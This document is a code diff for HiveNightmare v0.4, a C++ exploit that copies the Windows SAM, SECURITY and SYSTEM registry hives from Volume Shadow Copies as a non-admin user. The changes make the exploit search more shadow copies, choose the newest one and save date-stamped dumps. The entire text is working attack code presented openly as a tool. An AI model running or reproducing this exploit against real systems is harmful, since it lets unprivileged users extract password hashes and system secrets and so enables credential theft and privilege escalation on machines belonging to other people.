@@ -8,14 +8,21 @@
 // 0.4 - 21/07/2021 - better code shocker :O
 
 #include <windows.h>
-#include <stdio.h>
+#include <io.h>
+#include <fcntl.h>
 #include <iostream>
 
 using std::endl;
-using std::cout;
+using std::wcout;
 
 HANDLE getVssFileHandle(TCHAR* path, int maxSearch) {
     HANDLE hfile;
+    HANDLE retHandle = INVALID_HANDLE_VALUE;
+    FILETIME creationTime;
+    FILETIME lastAccessTime;
+    FILETIME lastWriteTime;
+    FILETIME youngest = { 0, 0 };
+
     wchar_t base[] = L"\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy";
 
     for (int i = 1; i <= maxSearch; i++) {
@@ -24,12 +31,16 @@ HANDLE getVssFileHandle(TCHAR* path, int maxSearch) {
 
         hfile = CreateFile(fullPath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
         if (hfile != INVALID_HANDLE_VALUE) {
-            return hfile;
+            if (GetFileTime(hfile, &creationTime, &lastAccessTime, &lastWriteTime)) {
+                if (CompareFileTime(&youngest, &lastWriteTime) < 0) {
+                    retHandle = hfile;
+                    youngest = lastWriteTime;
+                    wcout << "Newer file found: " << fullPath << endl;
+                }
+            }
         }
-
     }
-
-    return INVALID_HANDLE_VALUE;
+    return retHandle;
 }
 
 void dumpHandleToFile(HANDLE handle, wchar_t* dest) {
@@ -56,63 +67,91 @@ void dumpHandleToFile(HANDLE handle, wchar_t* dest) {
     CloseHandle(hAppend);
 }
 
+bool getFileTime(HANDLE handle, LPTSTR buf, int buflen) {
+    FILETIME creationTime;
+    FILETIME lastAccessTime;
+    FILETIME lastWriteTime;
+    SYSTEMTIME st;
+
+    if (!GetFileTime(handle, &creationTime, &lastAccessTime, &lastWriteTime)) {
+        if (buflen > 0)
+            buf[0] = L'\0';
+        return false;
+    }
+    FileTimeToSystemTime(&lastWriteTime, &st);
+    GetDateFormat(LOCALE_USER_DEFAULT, 0, &st, L"yyyy-MM-dd", buf, buflen);
+    
+    return true;
+}
+
+
+
 int main(int argc, char* argv[])
 {
     int searchDepth;
+    _setmode(_fileno(stdout), _O_U16TEXT);
     if (argc > 1) {
         if (sscanf_s(argv[1], "%d", &searchDepth) != 1) {
-            printf("\nUsage: HiveNightmare.exe [max shadows to look at (default 4)]\n\n");
+            wcout << "\nUsage: HiveNightmare.exe [max shadows to look at (default 4)]\n\n";
             return -1;
         }
     }
     else {
-        searchDepth = 4;
+        searchDepth = 15;
     }
 
-    printf("\nHiveNightmare v0.4 - dump registry hives as non-admin users\n\nSpecify maximum number of shadows to inspect with parameter if wanted, default is 4.\n\nRunning...\n\n");
+    wcout << L"\nHiveNightmare v0.4 - dump registry hives as non-admin users\n\nSpecify maximum number of shadows to inspect with parameter if wanted, default is 15.\n\nRunning...\n\n";
 
     HANDLE hFile;
 
     TCHAR samLocation[] = L"Windows\\System32\\config\\SAM";
     TCHAR securityLocation[] = L"Windows\\System32\\config\\SECURITY";
     TCHAR systemLocation[] = L"Windows\\System32\\config\\SYSTEM";
+    TCHAR fileTime[200];
+    TCHAR fileName[20];
 
     hFile = getVssFileHandle(samLocation, searchDepth);
     if (hFile == INVALID_HANDLE_VALUE) {
-        printf("Could not open SAM :( Is System Protection not enabled or vulnerability fixed?  Try increasing the number of VSS snapshots to search - list snapshots with vssadmin list shadows\n");
+        wcout << "Could not open SAM :( Is System Protection not enabled or vulnerability fixed?  Try increasing the number of VSS snapshots to search - list snapshots with vssadmin list shadows\n";
         return -1;
     }
     else {
-        dumpHandleToFile(hFile, (wchar_t*)L"SAM-haxx");
+        getFileTime(hFile, fileTime, 200);
+        swprintf_s(fileName, L"SAM-%s", fileTime);
+        dumpHandleToFile(hFile, fileName);
         CloseHandle(hFile);
-        cout << "SAM hive written out to current working directory" << endl;
+        wcout << endl << L"Copy of SAM hive from " << fileTime << L" written out to current working directory as " << fileName << endl << endl;
     }
     
 
     hFile = getVssFileHandle(securityLocation, searchDepth);
     if (hFile == INVALID_HANDLE_VALUE) {
-        printf("Could not open SECURITY :( Is System Protection not enabled or vulnerability fixed?  Try increasing the number of VSS snapshots to search - list snapshots with vssadmin list shadows\n");
+        wcout << "Could not open SECURITY :( Is System Protection not enabled or vulnerability fixed?  Try increasing the number of VSS snapshots to search - list snapshots with vssadmin list shadows\n";
         return -1;
     }
     else {
-        dumpHandleToFile(hFile, (wchar_t*)L"SECURITY-haxx");
+        getFileTime(hFile, fileTime, 200);
+        swprintf_s(fileName, L"SECURITY-%s", fileTime);
+        dumpHandleToFile(hFile, fileName);
         CloseHandle(hFile);
-        cout << "SECURITY hive written out to current working directory" << endl;
+        wcout << endl << L"SECURITY hive from " << fileTime << L" written out to current working directory as " << fileName << endl << endl;
     }
     
 
     hFile = getVssFileHandle(systemLocation, searchDepth);
     if (hFile == INVALID_HANDLE_VALUE) {
-        printf("Could not open SYSTEM :( Is System Protection not enabled or vulnerability fixed?  Try increasing the number of VSS snapshots to search - list snapshots with vssadmin list shadows\n");
+        wcout << "Could not open SYSTEM :( Is System Protection not enabled or vulnerability fixed?  Try increasing the number of VSS snapshots to search - list snapshots with vssadmin list shadows\n";
         return -1;
     }
     else {
-        dumpHandleToFile(hFile, (wchar_t*)L"SYSTEM-haxx");
+        getFileTime(hFile, fileTime, 200);
+        swprintf_s(fileName, L"SYSTEM-%s", fileTime);
+        dumpHandleToFile(hFile, fileName);
         CloseHandle(hFile);
-        cout << "SYSTEM hive written out to current working directory" << endl;
+        wcout << endl << L"SYSTEM hive from " << fileTime << L" written out to current working directory as " << fileName << endl << endl;
     }
 
-    cout << "Assuming no errors, should be able to find hive dump files in current working directory as SAM-haxx, \nSECURITY-haxx and SYSTEM-haxx" << endl;
+    wcout << endl << L"Assuming no errors, should be able to find hive dump files in current working directory." << endl;
 
     return 0;
 }
